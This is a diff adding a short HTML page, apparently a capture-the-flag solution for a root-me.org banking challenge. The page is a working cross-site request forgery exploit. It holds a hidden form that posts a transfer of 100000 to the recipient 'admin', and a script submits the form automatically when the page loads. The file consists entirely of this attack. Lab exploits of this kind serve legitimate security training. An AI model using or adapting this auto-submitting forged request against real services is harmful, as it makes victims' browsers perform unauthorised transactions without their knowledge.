@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Proof of Concept</title>
+</head>
+<body>
+    <h1>CSRF Attack Page</h1>
+    <form action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post">
+        <input type="hidden" name="recipient" value="admin">
+        <input type="hidden" name="amount" value="100000">
+    </form>
+    <script>
+        // Soumission automatique
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
